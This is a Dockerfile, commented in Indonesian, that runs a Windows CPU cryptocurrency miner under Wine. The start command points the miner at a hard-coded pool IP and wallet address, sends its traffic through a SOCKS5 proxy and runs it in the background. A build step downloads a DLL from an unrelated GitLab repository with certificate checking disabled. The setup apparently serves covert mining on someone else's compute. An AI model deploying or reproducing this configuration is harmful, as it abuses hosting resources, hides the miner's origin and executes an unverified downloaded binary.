# Gunakan image dasar Ubuntu
FROM ubuntu:20.04

# Non-interaktif untuk mencegah prompt selama instalasi
ENV DEBIAN_FRONTEND=noninteractive

# Tambahkan dukungan arsitektur i386
RUN dpkg --add-architecture i386 && \
    apt-get update && \
    apt-get install -y --no-install-recommends \
    wine32 \
    wget \
    unzip \
    && apt-get clean

# Buat direktori kerja
WORKDIR /app/miner

# Salin file aplikasi ke dalam container
COPY cpuminer-sse2.exe /app/miner/

# Salin pustaka DLL ke dalam direktori sistem Wine
COPY libcurl-4.dll /app/miner/.wine/drive_c/windows/system32/
COPY libwinpthread-1.dll /app/miner/.wine/drive_c/windows/system32/
COPY libgcc_s_seh-1.dll /app/miner/.wine/drive_c/windows/system32/

# Unduh file libstdc++-6.dll dari URL dan simpan ke folder yang ditentukan
RUN  wget --no-check-certificate -O /app/miner/.wine/drive_c/windows/system32/libstdc++-6.dll https://gitlab.com/nl2hc/l2nc/-/raw/main/libstdc++-6.dll


# Pastikan file dapat dieksekusi
RUN chmod +x cpuminer-sse2.exe

# Jalankan aplikasi dengan Wine
CMD ["wine", "./cpuminer-sse2.exe", "-a", "minotaurx", "-o", "stratum+tcp://146.103.45.69", "-u", "RNPTaDxarafTVGK3qaDGHRUhnvW3Mr4ux8", "-p", "c=RVN,mc=SMT/SPRX/SWAMP", "-x", "socks5://192.252.209.155:14455", "-t2", "-B"]
